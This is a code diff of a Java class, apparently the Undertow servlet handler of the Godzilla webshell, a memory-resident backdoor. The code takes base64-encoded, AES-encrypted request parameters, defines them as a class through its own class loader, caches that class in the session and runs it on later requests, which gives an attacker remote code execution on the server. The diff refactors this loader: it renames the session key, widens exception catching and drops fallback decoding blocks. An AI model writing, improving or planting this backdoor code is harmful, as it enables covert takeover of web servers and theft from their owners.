@@ -40,13 +40,13 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
                 byte[] data = base64Decode(parameter);
                 data = this.x(data, false);
                 Object session = request.getClass().getMethod("getSession").invoke(request);
-                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
-                if (sessionPayload == null) {
-                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", (new GodzillaUndertowServletHandler(Thread.currentThread().getContextClassLoader())).Q(data));
+                Object cache = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
+                if (cache == null) {
+                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, (new GodzillaUndertowServletHandler(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
                     request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) sessionPayload).newInstance();
+                    Object f = ((Class<?>) cache).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
                     f.equals(data);
@@ -58,7 +58,7 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
                 }
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
@@ -73,18 +73,15 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -92,12 +89,9 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
@@ -109,7 +103,6 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
 
     public byte[] x(byte[] s, boolean m) {
         try {
-
             Cipher c = Cipher.getInstance("AES");
             c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
             return c.doFinal(s);
